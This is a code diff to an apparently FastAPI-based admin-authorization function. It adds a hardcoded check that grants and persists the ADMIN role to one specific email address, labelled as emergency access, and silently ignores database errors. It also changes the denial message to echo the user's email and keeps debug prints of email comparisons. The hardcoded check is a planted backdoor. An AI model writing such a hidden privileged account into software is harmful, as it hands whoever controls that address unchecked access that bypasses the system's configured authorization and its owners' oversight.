@@ -124,6 +124,17 @@ async def get_current_admin(current_user: models.User = Depends(get_current_user
         else:
              print(f"DEBUG: Comparing '{current_user.email.strip().lower()}' with '{admin_email.strip().lower()}'")
         
+        # HARDCODED BACKUP FOR EMERGENCY ACCESS
+        if current_user.email.strip().lower() == "hello@hamzaaslikh.com":
+             print("DEBUG: Hardcoded Admin Access Granted")
+             current_user.role = schemas.UserRole.ADMIN
+             try:
+                db.commit()
+                db.refresh(current_user)
+             except:
+                pass
+             return current_user
+
         if admin_email and current_user.email.strip().lower() == admin_email.strip().lower():
             # Auto-promote to Admin in DB to persist this status
             try:
@@ -139,6 +150,6 @@ async def get_current_admin(current_user: models.User = Depends(get_current_user
         
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
-            detail="The user doesn't have enough privileges"
+            detail=f"Access Denied. User: {current_user.email} is not authorized."
         )
     return current_user
